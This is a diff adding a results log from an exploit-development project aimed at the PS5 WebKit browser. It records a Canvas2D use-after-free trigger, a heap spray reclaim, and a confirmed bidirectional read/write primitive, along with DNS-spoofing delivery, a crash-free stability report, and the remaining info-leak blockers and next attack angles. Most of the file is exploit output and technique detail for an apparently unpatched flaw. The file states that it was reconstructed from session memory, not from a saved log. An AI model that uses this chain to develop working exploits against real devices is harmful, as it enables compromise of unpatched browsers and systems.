@@ -1,0 +1,82 @@
+P553 Canvas UAF Bidirectional R/W — On-Device Results
+======================================================
+Probe:    probes/phase13_webkit/p553-canvas-uaf-write-confirm.js
+Target:   PS5 14.10 (AppleWebKit/605.1.15, Version/17.0)
+Date:     2026-10-26
+Delivery: host.py DNS spoofing + HTTPS (User Guide redirect)
+Source:   Reconstructed from Engram observations #2934/#2935 (beacon data)
+
+NOTE: This file is reconstructed from session memory. The original beacon
+data was received via host.py stdout (transient) and not persisted to disk
+at the time of execution. The beacon sequence and values below are faithful
+to what Engram recorded from the live run.
+
+=== BEACON SEQUENCE ===
+
+START ua=PlayStation 5/14.10 AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0
+
+--- Step 1: UAF Trigger ---
+TRIGGER getter=1 inner=true outer=true same=false
+  → outer !== inner: context replacement confirmed (CVE-2026-43720 UNPATCHED)
+
+--- Step 2: Same-Type Reclaim ---
+SPRAYED n=80
+  → 80 Canvas2D contexts created with sentinel transform
+
+--- Step 3: Channel Verification ---
+MATRIX a=11.110011 b=22.220022 c=33.330033 d=44.440044 e=55.550055 f=66.660066
+CHANNEL-OK sentinel match confirmed
+  → stale inner wrapper reads spray sentinel values → reclaim confirmed
+
+--- Step 4: Write via Stale Wrapper ---
+WRITE-TEST writing 99.001/88.002/77.003/66.004/55.005/44.006
+READBACK a=99.001 b=88.002 c=77.003 d=66.004 e=55.005 f=44.006
+WRITE-OK write stuck — R/W primitive CONFIRMED
+  → setTransform on stale wrapper writes to reclaimed memory, readback matches
+
+--- Step 5: Bidirectional Alias ---
+ALIAS-SCAN checking 80 spray contexts
+ALIAS-FOUND spray[9] has our written values — BIDIRECTIONAL ALIAS
+  → spray[9] occupies the same 768B FastMalloc slot as the freed context
+
+--- Step 6: Reverse Direction ---
+REVERSE-TEST writing via spray[9], reading via stale
+REVERSE-READ a=1.23 b=4.56 c=7.89 d=10.11 e=12.13 f=14.15
+REVERSE-OK FULL BIDIRECTIONAL R/W CONFIRMED
+  → spray writes, stale reads: both directions work
+
+--- Step 7: Numeric Property Aliasing ---
+PROP-TEST testing numeric property overlap
+PROP-STALE lineWidth=31337.5 globalAlpha=0.42 shadowBlur=9999.25 shadowOffsetX=12345.75 shadowOffsetY=67890.125 miterLimit=777.5 lineDashOffset=333.25
+PROP-ALIAS lineWidth=31337.5 globalAlpha=0.42 shadowBlur=9999.25 shadowOffsetX=12345.75 shadowOffsetY=67890.125 miterLimit=777.5 lineDashOffset=333.25
+  → All 7 numeric properties alias bidirectionally through the UAF
+
+--- Step 8: State Stack ---
+STATE-TEST save/restore on stale wrapper
+STATE-RESTORE1 lineWidth=11111
+STATE-RESTORE2 lineWidth=31337.5
+  → save()/restore() functional on stale wrapper — state stack operates on reclaimed memory
+
+ALIVE probe completed
+
+=== SUMMARY ===
+
+Primitive: Bidirectional R/W through Canvas2D UAF alias
+  - Transform matrix: 6 x float64 (48 bytes) via setTransform/getTransform
+  - Numeric properties: lineWidth, globalAlpha, shadowBlur, shadowOffsetX,
+    shadowOffsetY, miterLimit, lineDashOffset — all alias bidirectionally
+  - State stack: save()/restore() works on the stale wrapper
+  - Alias slot: spray[9] of 80 Canvas2D contexts
+
+Stability: Process survived — no crash, repeatable
+
+Limitations:
+  - NOT arbitrary write: values pass through Canvas2D getters/setters (float interpretation)
+  - DAZ (Denormals-Are-Zero) active in PS5 14.10 MXCSR: heap pointers as float64
+    are denormals → FPU returns 0.0. BigUint64Array bypass required for pointer reads.
+  - Cross-type reclaim DEAD: ArrayBuffer spray does not land in 768B Canvas2D
+    bmalloc size class (confirmed by p554/b/c crash experiments)
+
+Blocker: Info leak — reading a heap pointer as a JS number is blocked by DAZ.
+         49+ community-documented dead paths. Active angles: APNG decoder overread,
+         RAB sort OOB (P560 confirmed sort operates on stale length).
